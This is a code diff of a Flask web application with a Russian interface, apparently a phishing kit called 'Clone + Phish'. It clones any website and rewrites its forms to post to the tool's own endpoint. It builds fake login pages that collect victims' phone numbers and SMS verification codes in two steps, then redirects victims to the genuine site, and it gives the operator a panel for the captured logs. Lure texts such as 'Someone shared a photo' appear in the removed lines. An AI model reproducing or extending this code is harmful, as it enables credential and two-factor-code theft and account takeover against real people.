@@ -13,297 +13,138 @@ import json
 app = Flask(__name__)
 PROJECTS = {}
 
-# ========== ГЛАВНАЯ СТРАНИЦА ==========
 @app.route('/')
 def home():
     return r'''<!DOCTYPE html>
 <html lang="ru">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Site Cloner + Phish</title>
-    <style>
-        *{margin:0;padding:0;box-sizing:border-box}
-        body{background:#0a0a0f;color:#e0e0e0;font-family:Arial,sans-serif;min-height:100vh;display:flex;justify-content:center;align-items:center;padding:20px}
-        .box{max-width:500px;width:100%}
-        h1{text-align:center;font-size:28px;margin-bottom:5px;background:linear-gradient(135deg,#667eea,#f5576c);-webkit-background-clip:text;-webkit-text-fill-color:transparent}
-        .sub{text-align:center;color:#666;margin-bottom:20px;font-size:13px}
-        .tabs{display:flex;gap:10px;margin-bottom:20px}
-        .tab{flex:1;padding:12px;text-align:center;border-radius:12px;cursor:pointer;background:#111122;border:1px solid #222;font-size:14px}
-        .tab.active{background:#667eea;border-color:#667eea}
-        .tab-content{display:none}
-        .tab-content.active{display:block}
-        .card{background:#111122;border-radius:16px;padding:25px;border:1px solid #222}
-        label{display:block;margin-bottom:8px;color:#aaa;font-size:14px}
-        input,select{width:100%;padding:14px;border:1px solid #333;border-radius:12px;background:#0a0a14;color:#fff;font-size:16px;margin-bottom:15px}
-        input:focus,select:focus{outline:none;border-color:#667eea}
-        button{width:100%;padding:15px;border:none;border-radius:12px;font-size:16px;font-weight:600;cursor:pointer;color:#fff}
-        button:hover{opacity:0.85}
-        button:disabled{opacity:0.4}
-        .btn-clone{background:linear-gradient(135deg,#667eea,#764ba2)}
-        .btn-phish{background:linear-gradient(135deg,#f093fb,#f5576c)}
-        .result{margin-top:20px;padding:20px;border-radius:12px;display:none;word-break:break-all}
-        .result.show{display:block}
-        .result.success{background:#0a2a0a;border:1px solid #0f0}
-        .result.error{background:#2a0a0a;border:1px solid #f00}
-        .result a{color:#667eea}
-        .loading{display:none;text-align:center;padding:15px;color:#888}
-        .spinner{width:30px;height:30px;border:3px solid #333;border-top-color:#667eea;border-radius:50%;animation:spin 0.8s linear infinite;margin:0 auto 10px}
-        @keyframes spin{to{transform:rotate(360deg)}}
-        .stats{display:flex;gap:10px;margin-bottom:15px}
-        .stat{flex:1;text-align:center;padding:10px;background:#0a0a14;border-radius:8px}
-        .stat .num{font-size:24px;color:#667eea}
-        .stat .lbl{font-size:11px;color:#888}
-        .btn-dl{display:inline-block;background:#667eea;color:#fff;padding:10px 20px;border-radius:8px;text-decoration:none;margin:5px;font-size:14px}
-        .btn-panel{display:inline-block;background:#f5576c;color:#fff;padding:10px 20px;border-radius:8px;text-decoration:none;margin:5px;font-size:14px}
-    </style>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Site Cloner</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{background:#0a0a0f;color:#e0e0e0;font-family:Arial;min-height:100vh;display:flex;justify-content:center;align-items:center;padding:20px}
+.box{max-width:500px;width:100%}
+h1{text-align:center;font-size:28px;margin-bottom:20px;color:#667eea}
+.card{background:#111122;border-radius:16px;padding:25px;border:1px solid #222;margin-bottom:15px}
+label{display:block;margin-bottom:8px;color:#aaa;font-size:14px}
+input,select{width:100%;padding:14px;border:1px solid #333;border-radius:12px;background:#0a0a14;color:#fff;font-size:16px;margin-bottom:15px}
+input:focus,select:focus{outline:none;border-color:#667eea}
+button{width:100%;padding:15px;border:none;border-radius:12px;font-size:16px;font-weight:600;cursor:pointer;color:#fff}
+button:hover{opacity:0.85}
+.btn-clone{background:#667eea;margin-bottom:10px}
+.btn-phish{background:#f5576c}
+.result{margin-top:20px;padding:20px;border-radius:12px;display:none;word-break:break-all}
+.result.show{display:block}
+.result.success{background:#0a2a0a;border:1px solid #0f0}
+.result.error{background:#2a0a0a;border:1px solid #f00}
+.result a{color:#667eea;display:block;margin:5px 0}
+.loading{display:none;text-align:center;padding:15px;color:#888}
+.spinner{width:30px;height:30px;border:3px solid #333;border-top-color:#667eea;border-radius:50%;animation:spin 0.8s linear infinite;margin:0 auto 10px}
+@keyframes spin{to{transform:rotate(360deg)}}
+</style>
 </head>
 <body>
 <div class="box">
-    <h1>SITE TOOLS</h1>
-    <p class="sub">Clone & Phish</p>
-    
-    <div class="tabs">
-        <div class="tab active" onclick="switchTab('clone')">CLONE</div>
-        <div class="tab" onclick="switchTab('phish')">PHISH</div>
-    </div>
-    
-    <!-- CLONE TAB -->
-    <div class="tab-content active" id="tab-clone">
-        <div class="card">
-            <label>Website URL</label>
-            <input type="text" id="cloneUrl" placeholder="https://example.com">
-            <button class="btn-clone" onclick="doClone()" id="cloneBtn">CLONE SITE</button>
-        </div>
-    </div>
-    
-    <!-- PHISH TAB -->
-    <div class="tab-content" id="tab-phish">
-        <div class="card">
-            <label>Website URL (для дизайна)</label>
-            <input type="text" id="phishUrl" placeholder="https://max.ru">
-            <label>Story</label>
-            <select id="phishStory">
-                <option value="photo">Someone shared a photo</option>
-                <option value="message">New message</option>
-                <option value="voice">Missed call</option>
-                <option value="login">Please log in</option>
-            </select>
-            <button class="btn-phish" onclick="doPhish()" id="phishBtn">CREATE PHISH</button>
-        </div>
-    </div>
-    
-    <div class="loading" id="loading"><div class="spinner"></div><div>Working...</div></div>
-    <div class="result" id="result"></div>
+<h1>CLONE + PHISH</h1>
+<div class="card">
+<label>Ссылка на сайт</label>
+<input type="text" id="url" placeholder="https://example.com/login">
+<button class="btn-clone" onclick="doClone()">СКОПИРОВАТЬ САЙТ</button>
+<button class="btn-phish" onclick="doPhish()">СДЕЛАТЬ ФИШИНГ</button>
 </div>
-
+<div class="loading" id="load"><div class="spinner"></div>Работаю...</div>
+<div class="result" id="res"></div>
+</div>
 <script>
-function switchTab(t){
-    document.querySelectorAll('.tab').forEach(x=>x.classList.remove('active'));
-    document.querySelectorAll('.tab-content').forEach(x=>x.classList.remove('active'));
-    event.target.classList.add('active');
-    document.getElementById('tab-'+t).classList.add('active');
+async function doClone(){await run('/api/clone')}
+async function doPhish(){await run('/api/phish')}
+async function run(url){
+var u=document.getElementById('url').value.trim();
+if(!u)return;
+document.getElementById('load').style.display='block';
+document.getElementById('res').classList.remove('show');
+try{
+var r=await fetch(url,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({url:u})});
+var d=await r.json();
+if(d.error){document.getElementById('res').innerHTML='<b>Ошибка:</b> '+d.error;document.getElementById('res').classList.add('show','error')}
+else{
+document.getElementById('res').innerHTML='<b>ГОТОВО!</b><br><br><b>Клон:</b> <a href="'+d.url+'" target="_blank">'+d.url+'</a><br><b>Скачать:</b> <a href="'+d.download+'">ZIP</a><br><b>Логи:</b> <a href="'+d.panel+'" target="_blank">Панель</a><br><small>Файлов: '+d.assets+' | Форм: '+d.forms+'</small>';
+document.getElementById('res').classList.add('show','success')
 }
-
-async function doClone(){
-    var url=document.getElementById('cloneUrl').value.trim();
-    if(!url)return;
-    await runTask('/api/clone',{url:url});
-}
-
-async function doPhish(){
-    var url=document.getElementById('phishUrl').value.trim();
-    var story=document.getElementById('phishStory').value;
-    if(!url)return;
-    await runTask('/api/phish',{url:url,story:story});
-}
-
-async function runTask(endpoint,data){
-    var btn=document.querySelectorAll('button');
-    var load=document.getElementById('loading');
-    var res=document.getElementById('result');
-    btn.forEach(b=>b.disabled=true);
-    load.style.display='block';
-    res.classList.remove('show');
-    try{
-        var r=await fetch(endpoint,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(data)});
-        var d=await r.json();
-        if(d.error){
-            res.innerHTML='<b>Error:</b> '+d.error;
-            res.classList.add('show','error');
-        }else{
-            var html='<div class="stats"><div class="stat"><div class="num">'+d.assets+'</div><div class="lbl">Files</div></div><div class="stat"><div class="num">'+d.forms+'</div><div class="lbl">Forms</div></div></div>';
-            html+='<b>Clone URL:</b><br><a href="'+d.url+'" target="_blank">'+d.url+'</a><br><br>';
-            html+='<a href="'+d.download+'" class="btn-dl">DOWNLOAD ZIP</a>';
-            html+='<a href="'+d.panel+'" class="btn-panel" target="_blank">LOGS PANEL</a>';
-            html+='<br><br><b>Victim Logs:</b><br><a href="'+d.logs+'" target="_blank">'+d.logs+'</a>';
-            res.innerHTML=html;
-            res.classList.add('show','success');
-        }
-    }catch(e){
-        res.innerHTML='<b>Error:</b> '+e.message;
-        res.classList.add('show','error');
-    }
-    btn.forEach(b=>b.disabled=false);
-    load.style.display='none';
+}catch(e){document.getElementById('res').innerHTML='<b>Ошибка:</b> '+e.message;document.getElementById('res').classList.add('show','error')}
+document.getElementById('load').style.display='none'
 }
 </script>
 </body>
 </html>'''
 
-# ========== PHISH HTML GENERATOR ==========
-def make_phish_page(phish_id, brand_name, primary_color, logo_url, story_title, story_body, story_button, redirect_url):
-    logo_html = '<img src="' + logo_url + '" style="height:40px">' if logo_url else '<div style="font-size:24px;font-weight:700">' + brand_name + '</div>'
+# ========== ЗАГРУЗКА РЕСУРСОВ ==========
+def download_assets(sess, soup, base_url, out_dir):
+    assets = 0
+    # CSS
+    for tag in soup.find_all('link', href=True):
+        href = urljoin(base_url, tag['href'].strip())
+        try:
+            name = os.path.basename(urlparse(href).path.split('?')[0])
+            if not name or '.' not in name: name = 'style.css'
+            r = sess.get(href, timeout=10)
+            if r.status_code == 200 and len(r.content) > 100:
+                with open(out_dir + '/assets/' + name, 'wb') as f: f.write(r.content)
+                tag['href'] = 'assets/' + name
+                assets += 1
+        except: pass
     
-    return '''<!DOCTYPE html>
-<html lang="ru">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>''' + brand_name + '''</title>
-    <style>
-        *{margin:0;padding:0;box-sizing:border-box}
-        body{
-            background:#f5f5f5;
-            font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;
-            min-height:100vh;
-            display:flex;
-            flex-direction:column;
-            align-items:center;
-            justify-content:center;
-            padding:20px;
-        }
-        .container{max-width:380px;width:100%;text-align:center}
-        .logo{margin-bottom:30px}
-        .card{
-            background:#fff;
-            border-radius:16px;
-            padding:30px 20px;
-            box-shadow:0 2px 20px rgba(0,0,0,0.08);
-            margin-bottom:20px;
-        }
-        .icon{
-            width:60px;height:60px;
-            background:''' + primary_color + ''';
-            border-radius:50%;
-            display:flex;align-items:center;justify-content:center;
-            margin:0 auto 20px;
-            font-size:28px;
-        }
-        .story-title{font-size:18px;font-weight:600;color:#000;margin-bottom:10px}
-        .story-body{font-size:14px;color:#666;margin-bottom:25px;line-height:1.5}
-        .input-group{margin-bottom:15px;text-align:left}
-        .input-group label{display:block;font-size:13px;color:#888;margin-bottom:5px}
-        .input-group input{
-            width:100%;padding:14px 16px;
-            border:1.5px solid #e0e0e0;
-            border-radius:12px;
-            font-size:16px;
-            background:#f8f8f8;
-        }
-        .input-group input:focus{outline:none;border-color:''' + primary_color + ''';background:#fff}
-        .phone-row{display:flex;gap:8px}
-        .phone-row select{
-            padding:14px 12px;
-            border:1.5px solid #e0e0e0;
-            border-radius:12px;
-            font-size:16px;
-            background:#f8f8f8;
-        }
-        .phone-row input{flex:1}
-        .btn{
-            width:100%;padding:15px;
-            background:''' + primary_color + ''';
-            color:#fff;border:none;
-            border-radius:12px;
-            font-size:17px;font-weight:600;
-            cursor:pointer;margin-top:5px;
-        }
-        .btn:hover{opacity:0.9}
-        .btn:disabled{opacity:0.5}
-        .footer{font-size:12px;color:#999;text-align:center;margin-top:20px;line-height:1.6}
-        .footer a{color:''' + primary_color + ''';text-decoration:none}
-        .error{background:#fff0f0;color:#d00;padding:12px;border-radius:10px;font-size:13px;margin-bottom:15px;display:none}
-        .loading{display:none;text-align:center;color:#888;font-size:14px;margin:15px 0}
-        .spinner{
-            display:inline-block;width:20px;height:20px;
-            border:2px solid #ddd;border-top-color:''' + primary_color + ''';
-            border-radius:50%;animation:spin 0.8s linear infinite;
-            margin-right:8px;vertical-align:middle;
-        }
-        @keyframes spin{to{transform:rotate(360deg)}}
-    </style>
-</head>
-<body>
-<div class="container">
-    <div class="logo">''' + logo_html + '''</div>
-    <div class="card">
-        <div class="icon">MSG</div>
-        <div class="story-title">''' + story_title + '''</div>
-        <div class="story-body">''' + story_body + '''</div>
-        <div class="error" id="error"></div>
-        <form id="f">
-            <div class="input-group">
-                <label>Phone number</label>
-                <div class="phone-row">
-                    <select><option>+7</option><option>+375</option><option>+380</option></select>
-                    <input type="tel" id="phone" placeholder="(999) 123-45-67" required autofocus>
-                </div>
-            </div>
-            <div class="input-group" id="codeGroup" style="display:none">
-                <label>SMS Code</label>
-                <input type="text" id="code" placeholder="Enter code" maxlength="6">
-            </div>
-            <button type="submit" class="btn" id="btn">''' + story_button + '''</button>
-        </form>
-        <div class="loading" id="loading"><div class="spinner"></div>Checking...</div>
-    </div>
-    <div class="footer">By clicking, you agree to<br><a href="#">Terms</a> and <a href="#">Privacy Policy</a></div>
-</div>
-<script>
-var step=1;
-var pid=''' + phish_id + '''';
-var redir=''' + redirect_url + '''';
-document.getElementById('phone').addEventListener('input',function(e){
-    var v=e.target.value.replace(/[^0-9]/g,'');
-    if(v.length>10)v=v.slice(0,10);
-    if(v.length>0)v='('+v.slice(0,3)+') '+v.slice(3,6)+'-'+v.slice(6,10);
-    e.target.value=v;
-});
-document.getElementById('f').addEventListener('submit',function(e){
-    e.preventDefault();
-    var phone=document.getElementById('phone').value.replace(/[^0-9]/g,'');
-    if(step===1){
-        if(phone.length<10){showError('Enter full number');return;}
-        fetch('/submit/'+pid,{method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:'phone='+phone+'&step=1'});
-        document.getElementById('codeGroup').style.display='block';
-        document.getElementById('btn').textContent='Confirm';
-        document.getElementById('code').focus();
-        step=2;
-    }else{
-        var code=document.getElementById('code').value.trim();
-        if(code.length<4){showError('Enter full code');return;}
-        document.getElementById('loading').style.display='block';
-        document.getElementById('btn').disabled=true;
-        fetch('/submit/'+pid,{method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:'phone='+phone+'&code='+code+'&step=2'});
-        setTimeout(function(){window.location.href=redir},3000);
-    }
-});
-function showError(m){
-    var er=document.getElementById('error');
-    er.textContent=m;er.style.display='block';
-    setTimeout(function(){er.style.display='none'},3000);
-}
-</script>
-</body>
-</html>'''
+    # JS
+    for tag in soup.find_all('script', src=True):
+        src = urljoin(base_url, tag['src'].strip())
+        try:
+            name = os.path.basename(urlparse(src).path.split('?')[0])
+            if not name or '.' not in name: name = 'script.js'
+            r = sess.get(src, timeout=10)
+            if r.status_code == 200 and len(r.content) > 100:
+                with open(out_dir + '/assets/' + name, 'wb') as f: f.write(r.content)
+                tag['src'] = 'assets/' + name
+                assets += 1
+        except: pass
+    
+    # IMG
+    for tag in soup.find_all('img', src=True):
+        src = tag['src'].strip()
+        if not src or src.startswith('data:'): continue
+        src = urljoin(base_url, src)
+        try:
+            ext = os.path.splitext(urlparse(src).path.split('?')[0])[1] or '.png'
+            name = 'img_' + str(abs(hash(src)))[:8] + ext
+            r = sess.get(src, timeout=10)
+            if r.status_code == 200 and len(r.content) > 100:
+                with open(out_dir + '/assets/' + name, 'wb') as f: f.write(r.content)
+                tag['src'] = 'assets/' + name
+                assets += 1
+        except: pass
+    
+    # BACKGROUND IMAGES
+    for tag in soup.find_all(style=True):
+        urls = re.findall(r'url\(["\']?([^"\'()]+)["\']?\)', str(tag['style']))
+        for u in urls:
+            src = urljoin(base_url, u)
+            try:
+                ext = os.path.splitext(urlparse(src).path.split('?')[0])[1] or '.png'
+                name = 'bg_' + str(abs(hash(src)))[:8] + ext
+                r = sess.get(src, timeout=10)
+                if r.status_code == 200 and len(r.content) > 100:
+                    with open(out_dir + '/assets/' + name, 'wb') as f: f.write(r.content)
+                    tag['style'] = tag['style'].replace(u, 'assets/' + name)
+                    assets += 1
+            except: pass
+    
+    return assets
 
 # ========== API CLONE ==========
 @app.route('/api/clone', methods=['POST'])
 def api_clone():
-    data = request.get_json(silent=True) or {}
-    url = data.get('url', '').strip()
-    if not url: return jsonify({'error': 'URL required'}), 400
+    url = (request.get_json(silent=True) or {}).get('url', '').strip()
+    if not url: return jsonify({'error': 'Введите URL'}), 400
     if not url.startswith('http'): url = 'https://' + url
     
     pid = 'c' + hashlib.md5((url + str(time.time())).encode()).hexdigest()[:10]
@@ -311,67 +152,53 @@ def api_clone():
     os.makedirs(out + '/assets', exist_ok=True)
     
     sess = requests.Session()
-    sess.headers['User-Agent'] = 'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X)'
+    sess.headers.update({
+        'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15',
+        'Accept': 'text/html,application/xhtml+xml;q=0.9,*/*;q=0.8',
+        'Accept-Language': 'ru-RU,ru;q=0.9'
+    })
     
     try:
         r = sess.get(url, allow_redirects=True, timeout=20)
         if r.status_code != 200: return jsonify({'error': 'HTTP ' + str(r.status_code)}), 400
+        
         soup = BeautifulSoup(r.text, 'html.parser')
-        domain = urlparse(r.url).netloc
-        assets = 0
+        final_url = r.url
+        domain = urlparse(final_url).netloc
+        assets = download_assets(sess, soup, final_url, out)
         forms = 0
         
-        for tag in soup.find_all('link', href=True):
-            href = tag['href'].strip()
-            if not href: continue
-            if not href.startswith('http'): href = urljoin(url, href)
-            try:
-                name = os.path.basename(urlparse(href).path.split('?')[0]) or 'style.css'
-                if '.' not in name: name += '.css'
-                ar = sess.get(href, timeout=10)
-                if ar.status_code == 200 and len(ar.content) > 100:
-                    with open(out + '/assets/' + name, 'wb') as f: f.write(ar.content)
-                    tag['href'] = '/p/' + pid + '/assets/' + name
-                    assets += 1
-            except: pass
-        
-        for tag in soup.find_all('script', src=True):
-            src = tag['src'].strip()
-            if not src: continue
-            if not src.startswith('http'): src = urljoin(url, src)
-            try:
-                name = os.path.basename(urlparse(src).path.split('?')[0]) or 'script.js'
-                if '.' not in name: name += '.js'
-                ar = sess.get(src, timeout=10)
-                if ar.status_code == 200 and len(ar.content) > 100:
-                    with open(out + '/assets/' + name, 'wb') as f: f.write(ar.content)
-                    tag['src'] = '/p/' + pid + '/assets/' + name
-                    assets += 1
-            except: pass
-        
-        for tag in soup.find_all('img', src=True):
-            src = tag['src'].strip()
-            if not src or src.startswith('data:'): continue
-            if not src.startswith('http'): src = urljoin(url, src)
-            try:
-                ext = os.path.splitext(urlparse(src).path.split('?')[0])[1] or '.png'
-                name = 'img_' + str(abs(hash(src)))[:8] + ext
-                ar = sess.get(src, timeout=10)
-                if ar.status_code == 200 and len(ar.content) > 100:
-                    with open(out + '/assets/' + name, 'wb') as f: f.write(ar.content)
-                    tag['src'] = '/p/' + pid + '/assets/' + name
-                    assets += 1
-            except: pass
-        
+        # Меняем формы
         for form in soup.find_all('form'):
             form['action'] = '/submit/' + pid
             form['method'] = 'POST'
+            # Убираем оригинальные обработчики
+            for attr in ['onsubmit', 'onclick']:
+                if form.get(attr): del form[attr]
             forms += 1
         
+        # Сохраняем HTML
+        html = '<!DOCTYPE html>\n<html>\n<head>\n<meta charset="UTF-8">\n'
+        html += '<meta name="viewport" content="width=device-width, initial-scale=1.0">\n'
+        html += '<base href="/p/' + pid + '/">\n'
+        # Копируем ВСЕ теги из head
+        head = soup.find('head')
+        if head:
+            for tag in head.find_all(True):
+                if tag.name not in ['script', 'link', 'meta', 'title', 'style']: continue
+                html += str(tag) + '\n'
+        html += '</head>\n'
+        
         body = soup.find('body')
-        html = '<!DOCTYPE html>\n<html>\n<head>\n<meta charset="UTF-8">\n<meta name="viewport" content="width=device-width, initial-scale=1.0">\n<title>' + domain + '</title>\n'
-        for tag in soup.find_all('link', href=True): html += str(tag) + '\n'
-        html += '</head>\n<body>\n' + (str(body) if body else str(soup)) + '\n</body>\n</html>'
+        if body:
+            # Убираем скрипты которые могут мешать
+            for script in body.find_all('script'):
+                if script.get('src') and any(x in script['src'] for x in ['analytics', 'gtag', 'metric']):
+                    script.decompose()
+            html += str(body)
+        else:
+            html += str(soup)
+        html += '\n</html>'
         
         with open(out + '/index.html', 'w', encoding='utf-8') as f: f.write(html)
         
@@ -380,8 +207,7 @@ def api_clone():
         host = request.host_url.rstrip('/')
         return jsonify({
             'id': pid, 'url': host + '/p/' + pid, 'download': host + '/api/download/' + pid,
-            'panel': host + '/panel/' + pid, 'logs': host + '/api/logs/' + pid,
-            'assets': assets, 'forms': forms
+            'panel': host + '/panel/' + pid, 'assets': assets, 'forms': forms
         })
     except Exception as e:
         return jsonify({'error': str(e)[:200]}), 500
@@ -389,71 +215,185 @@ def api_clone():
 # ========== API PHISH ==========
 @app.route('/api/phish', methods=['POST'])
 def api_phish():
-    data = request.get_json(silent=True) or {}
-    url = data.get('url', '').strip()
-    story_key = data.get('story', 'photo')
-    if not url: return jsonify({'error': 'URL required'}), 400
+    url = (request.get_json(silent=True) or {}).get('url', '').strip()
+    if not url: return jsonify({'error': 'Введите URL'}), 400
     if not url.startswith('http'): url = 'https://' + url
-    
-    stories = {
-        'photo': {'title': 'Someone shared a photo with you', 'body': 'Log in to your account to view the image.', 'button': 'Continue'},
-        'message': {'title': 'New message', 'body': 'You have an unread message. Log in to view.', 'button': 'Open'},
-        'voice': {'title': 'Missed call', 'body': 'You have a missed voice call. Log in to listen.', 'button': 'Listen'},
-        'login': {'title': 'Login required', 'body': 'Please log in to continue.', 'button': 'Log in'},
-    }
-    story = stories.get(story_key, stories['photo'])
     
     pid = 'p' + hashlib.md5((url + str(time.time())).encode()).hexdigest()[:10]
     out = '/tmp/' + pid
     os.makedirs(out + '/assets', exist_ok=True)
     
     sess = requests.Session()
-    sess.headers['User-Agent'] = 'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X)'
+    sess.headers.update({
+        'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15',
+        'Accept': 'text/html,application/xhtml+xml;q=0.9,*/*;q=0.8',
+        'Accept-Language': 'ru-RU,ru;q=0.9'
+    })
     
     try:
         r = sess.get(url, allow_redirects=True, timeout=20)
+        if r.status_code != 200: return jsonify({'error': 'HTTP ' + str(r.status_code)}), 400
+        
         soup = BeautifulSoup(r.text, 'html.parser')
-        domain = urlparse(r.url).netloc
+        final_url = r.url
+        domain = urlparse(final_url).netloc
+        assets = download_assets(sess, soup, final_url, out)
+        forms = 0
         
-        title = soup.find('title')
-        brand = title.text.split('|')[0].split('"')[0].strip()[:30] if title else domain
+        # Находим главную форму
+        main_form = soup.find('form')
         
-        primary = '#007aff'
-        for style in soup.find_all('style'):
-            if style.string:
-                colors = re.findall(r'#[0-9a-fA-F]{6}', style.string)
-                if colors: primary = colors[0]; break
+        if main_form:
+            # Очищаем форму
+            main_form.clear()
+            main_form['action'] = '/submit/' + pid
+            main_form['method'] = 'POST'
+            main_form['id'] = 'phishForm'
+            
+            # Создаём поля
+            phone_div = soup.new_tag('div')
+            phone_div['class'] = main_form.get('class', '')
+            
+            phone_label = soup.new_tag('label')
+            phone_label.string = 'Номер телефона'
+            phone_div.append(phone_label)
+            
+            phone_input = soup.new_tag('input')
+            phone_input['type'] = 'tel'
+            phone_input['name'] = 'phone'
+            phone_input['placeholder'] = '+7 (999) 123-45-67'
+            phone_input['required'] = ''
+            phone_input['style'] = 'width:100%;padding:14px;border-radius:12px;border:1px solid #ccc;font-size:16px;margin-bottom:10px'
+            phone_div.append(phone_input)
+            
+            # Код
+            code_div = soup.new_tag('div')
+            code_div['id'] = 'codeDiv'
+            code_div['style'] = 'display:none'
+            
+            code_label = soup.new_tag('label')
+            code_label.string = 'Код из SMS'
+            code_div.append(code_label)
+            
+            code_input = soup.new_tag('input')
+            code_input['type'] = 'text'
+            code_input['name'] = 'code'
+            code_input['placeholder'] = 'Введите код'
+            code_input['maxlength'] = '6'
+            code_input['style'] = 'width:100%;padding:14px;border-radius:12px;border:1px solid #ccc;font-size:16px;margin-bottom:10px'
+            code_div.append(code_input)
+            
+            # Кнопка
+            btn = soup.new_tag('button')
+            btn['type'] = 'submit'
+            btn['id'] = 'phishBtn'
+            btn['style'] = 'width:100%;padding:15px;background:#007aff;color:#fff;border:none;border-radius:12px;font-size:17px;font-weight:600;cursor:pointer'
+            btn.string = 'Продолжить'
+            
+            # Собираем
+            main_form.append(phone_div)
+            main_form.append(code_div)
+            main_form.append(btn)
+            
+            # Добавляем скрипт перехвата
+            script = soup.new_tag('script')
+            script.string = '''
+var step=1;
+var phishId=''' + pid + '''';
+var redirectUrl=''' + json.dumps(final_url) + ''';
+document.getElementById('phishForm').addEventListener('submit',function(e){
+    e.preventDefault();
+    var phone=this.querySelector('[name="phone"]').value.replace(/[^0-9]/g,'');
+    if(step===1){
+        if(phone.length<10){alert('Введите полный номер');return;}
+        fetch('/submit/'+phishId,{method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:'phone='+phone+'&step=1'});
+        document.getElementById('codeDiv').style.display='block';
+        document.getElementById('phishBtn').textContent='Подтвердить';
+        this.querySelector('[name="code"]').focus();
+        step=2;
+    }else{
+        var code=this.querySelector('[name="code"]').value.trim();
+        if(code.length<4){alert('Введите код');return;}
+        fetch('/submit/'+phishId,{method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:'phone='+phone+'&code='+code+'&step=2'});
+        document.getElementById('phishBtn').textContent='Проверка...';
+        document.getElementById('phishBtn').disabled=true;
+        setTimeout(function(){window.location.href=redirectUrl},3000);
+    }
+});
+'''
+            soup.find('body').append(script) if soup.find('body') else soup.append(script)
+            forms = 1
+        else:
+            # Если нет формы - создаём
+            wrapper = soup.new_tag('div')
+            wrapper['style'] = 'max-width:350px;margin:50px auto;padding:30px;background:#fff;border-radius:16px;box-shadow:0 2px 20px rgba(0,0,0,0.1);text-align:center;font-family:Arial'
+            
+            wrapper.append(BeautifulSoup('<h2 style="margin-bottom:10px">Вход</h2><p style="color:#666;margin-bottom:20px">Введите номер телефона</p>', 'html.parser'))
+            
+            form = soup.new_tag('form')
+            form['action'] = '/submit/' + pid
+            form['method'] = 'POST'
+            form['id'] = 'phishForm'
+            form['style'] = 'text-align:left'
+            
+            form.append(BeautifulSoup('<label style="display:block;font-size:14px;color:#888;margin-bottom:5px">Номер телефона</label><input type="tel" name="phone" placeholder="+7 (999) 123-45-67" required style="width:100%;padding:14px;border-radius:12px;border:1px solid #ddd;font-size:16px;margin-bottom:10px"><div id="codeDiv" style="display:none"><label style="display:block;font-size:14px;color:#888;margin-bottom:5px">Код из SMS</label><input type="text" name="code" placeholder="Введите код" maxlength="6" style="width:100%;padding:14px;border-radius:12px;border:1px solid #ddd;font-size:16px;margin-bottom:10px"></div><button type="submit" id="phishBtn" style="width:100%;padding:15px;background:#007aff;color:#fff;border:none;border-radius:12px;font-size:17px;font-weight:600;cursor:pointer">Продолжить</button>', 'html.parser'))
+            
+            wrapper.append(form)
+            
+            script = soup.new_tag('script')
+            script.string = '''
+var step=1;
+var phishId=''' + pid + '''';
+var redirectUrl=''' + json.dumps(final_url) + ''';
+document.getElementById('phishForm').addEventListener('submit',function(e){
+    e.preventDefault();
+    var phone=this.querySelector('[name="phone"]').value.replace(/[^0-9]/g,'');
+    if(step===1){
+        if(phone.length<10){alert('Введите полный номер');return;}
+        fetch('/submit/'+phishId,{method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:'phone='+phone+'&step=1'});
+        document.getElementById('codeDiv').style.display='block';
+        document.getElementById('phishBtn').textContent='Подтвердить';
+        this.querySelector('[name="code"]').focus();
+        step=2;
+    }else{
+        var code=this.querySelector('[name="code"]').value.trim();
+        if(code.length<4){alert('Введите код');return;}
+        fetch('/submit/'+phishId,{method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:'phone='+phone+'&code='+code+'&step=2'});
+        document.getElementById('phishBtn').textContent='Проверка...';
+        document.getElementById('phishBtn').disabled=true;
+        setTimeout(function(){window.location.href=redirectUrl},3000);
+    }
+});
+'''
+            wrapper.append(script)
+            
+            if soup.find('body'):
+                soup.find('body').clear()
+                soup.find('body').append(wrapper)
+            else:
+                soup.clear()
+                soup.append(wrapper)
+            forms = 1
         
-        logo = None
-        for img in soup.find_all('img'):
-            src = img.get('src', '')
-            if 'logo' in src.lower() or 'logo' in img.get('alt', '').lower():
-                logo = src
-                break
-        
-        local_logo = None
-        if logo:
-            try:
-                logo_url = urljoin(url, logo)
-                ar = sess.get(logo_url, timeout=10)
-                if ar.status_code == 200:
-                    ext = os.path.splitext(urlparse(logo_url).path)[1] or '.png'
-                    lname = 'logo' + ext
-                    with open(out + '/assets/' + lname, 'wb') as f: f.write(ar.content)
-                    local_logo = '/p/' + pid + '/assets/' + lname
-            except: pass
-        
-        html = make_phish_page(pid, brand, primary, local_logo, story['title'], story['body'], story['button'], url)
+        # Сохраняем
+        html = '<!DOCTYPE html>\n<html>\n<head>\n<meta charset="UTF-8">\n'
+        html += '<meta name="viewport" content="width=device-width, initial-scale=1.0">\n'
+        html += '<base href="/p/' + pid + '/">\n'
+        head = soup.find('head')
+        if head:
+            for tag in head.find_all(True):
+                if tag.name in ['meta', 'title', 'link', 'style']:
+                    html += str(tag) + '\n'
+        html += '</head>\n' + (str(soup.find('body')) if soup.find('body') else str(soup)) + '\n</html>'
         
         with open(out + '/index.html', 'w', encoding='utf-8') as f: f.write(html)
         
-        PROJECTS[pid] = {'url': url, 'domain': domain, 'dir': out, 'assets': 1, 'forms': 1, 'logs': [], 'type': 'phish'}
+        PROJECTS[pid] = {'url': url, 'domain': domain, 'dir': out, 'assets': assets, 'forms': forms, 'logs': [], 'type': 'phish'}
         
